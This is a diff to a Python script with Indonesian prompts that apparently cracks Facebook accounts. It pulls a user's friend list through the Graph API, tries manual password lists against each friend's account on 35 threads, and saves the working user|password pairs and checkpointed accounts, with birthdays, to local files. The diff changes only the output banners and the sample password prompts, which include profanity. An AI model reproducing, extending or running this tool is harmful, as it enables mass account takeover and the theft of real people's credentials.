@@ -75,14 +75,14 @@ class gas:
         if 'c_user' in d.cookies.get_dict().keys():
             ok+=1
             open('ok','a').write(user+'|'+pw+'\n')
-            print(f'\r\x1b[1;32m*XNXX.COM > [OK] ~ {user}|{pw}|{d.cookies}\x1b[0m\n',end='')
+            print(f'\r\x1b[1;32m[OK] ~ {user}|{pw}{d.cookies}\x1b[0m\n',end='')
         elif 'checkpoint' in d.cookies.get_dict().keys():
             cp+=1
             r=json.loads(req.get(f'https://graph.facebook.com/{user}?access_token={self.token}').text)
             try:ttl=r['birthday']
             except:ttl=''
             open('cp','a').write(user+'|'+pw+'|'+ttl+'\n')
-            print(f'\r\x1b[1;33m*XNXX.COM > [CP] ~ {user}|{pw}|{ttl}\x1b[0m\n',end='')
+            print(f'\r\x1b[1;33m[CP] ~ {user}|{pw}{ttl}\x1b[0m\n',end='')
         print(f'\rCRACK:-{str(cot)}/{len(id)} OK/CP:-{str(ok)}/{str(cp)}',end='')
     def get1(self):
         r=json.loads(req.get(f'https://graph.facebook.com/me/friends?access_token={self.token}').text)
@@ -90,12 +90,12 @@ class gas:
             asu=x['id']
             nama=x['name'].rsplit(" ")[0]
             id.append(asu+'|'+nama)
-        print('[ CRACK DAFTAR TEMAN ANDA ]')
+        print('[ CRACK KONCOMU DEWE ]')
         print('\n[+] Jumlah Teman:',str(len(id)))
         pi=input('[?] Pwlist Manual y/t: ')
         if(pi in ("y","Y")):
             with Bool(max_workers=35) as kirim:
-                print("\nContoh (anjing,monyet,bangsat)")
+                print("\nContoh (anjing,jangan,dibaca)")
                 pwList=input('[+] Masukan Password List: ').split(",")
                 print('\nStarting Crack...\n--------------------------------\n')
                 for email in id:
@@ -137,7 +137,7 @@ class gas:
         print('[+] Jumlah Teman:',str(len(id)))
         memek=input("[?] Pwlist Manual y/t : ")
         if(memek in ("y","Y")):
-            print("\nContoh (anjing,bangsat,monyet)")
+            print("\nContoh (jangan,dibaca,tolol)")
             pwList=input("[+] Masukan Password : ").split(",")
             with Bool(max_workers=35) as kirim:
                 print('\n[+] Starting Crack...\n--------------------------------\n')
